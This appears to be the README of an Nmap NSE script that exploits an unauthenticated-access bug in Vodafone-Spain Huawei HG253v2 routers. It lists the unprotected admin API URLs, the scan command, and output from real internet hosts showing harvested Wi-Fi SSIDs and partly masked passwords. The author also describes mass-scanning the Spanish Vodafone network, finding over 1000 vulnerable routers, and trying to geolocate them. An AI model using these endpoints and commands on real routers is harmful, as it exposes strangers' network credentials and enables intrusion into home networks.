# http-enum-vodafone-hua253s.nse

### Introduction

Vodafone-Spain is starting to rent a new Huawei HG253v2 router to the spanish costumers. This new router is coming with a new firmware version.

### The pre-scholar bug

![Logo](img/prescholar.gif)

I found a new simple security bug in that new firmware version. It is so easy to see it that I named it "the Pre-scholar bug". Basically, it is not validating the session cookie in some administration webpages:

 - http://<IP>/html_253s/api/ntwk/WlanBasic
 - http://<IP>/html_253s/api/system/diagnose_internet
 - http://<IP>/html_253s/api/system/hostinfo?type=ethhost
 - http://<IP>/html_253s/api/system/hostinfo?type=guesthost
 - http://<IP>/html_253s/api/system/hostinfo?type=homehost
 - http://<IP>/html_253s/api/system/hostinfo?type=wifihost
 - http://<IP>/html_253s/api/system/wizardcfg

So, It is possible to get direct information from those urls in any router open to internet.

### About the NSE script

This is a Nmap NSE script to search Vodafone-Spain Huawei 253s_v2 router with the port 80/tcp and/or 443/tcp open to Internet (via this new bug).

The script will try to get the SSID, BSSID, key-type and Password of the wifi network interface.

It was tested with:

  - HW: AV1HG253SBZDM
  - Firmware: V100R001C205B038SP0x (being x a number)

Command line and result:

```
nmap -sS -p80,443 -script http-enum-vodafone-hua253s.nse x.x.x.*

Nmap scan report for xxxxxxxx.dyn.user.ono.com (x.x.x.x)
Host is up (0.089s latency).
PORT    STATE    SERVICE
80/tcp  filtered http
443/tcp filtered https

Nmap scan report for xxxxxxx.dyn.user.ono.com (x.x.x.x)
Host is up (0.091s latency).
PORT    STATE SERVICE
80/tcp  open  http
|_http-enum-vodafone-hua253s:   SSID: vodafone851X (c4:07:2f:89:xx:xx)   Pass(AES): FSLJLMZFC3W9XX
443/tcp open  https
|_http-enum-vodafone-hua253s:   SSID: vodafone851X (c4:07:2f:89:xx:xx)   Pass(AES): FSLJLMZFC3W9XX

Nmap scan report for xxxxxxx.dyn.user.ono.com (x.x.x.x)
Host is up (0.089s latency).
PORT    STATE    SERVICE
80/tcp  filtered http
443/tcp filtered https

```

### Scope

I have checked the Spanish Vodafone network trying to guess what the real scope is and I found >1000 routers with the "correct" brand, open port to internet and the bug working.

### Experiments

After speaking to a friend of mine, I was trying to geolocate this routers using Google geolocate API and the found BSSID. But it was not possible. The spanish BSSID (MAC address) database by google seems very poor. All my tries got a "Not found" answer :,(
Using other IP location services was worse. They are completely inaccurate.

### Notes

 - Sorry for my ugly English.
 - Oldschool is alive.
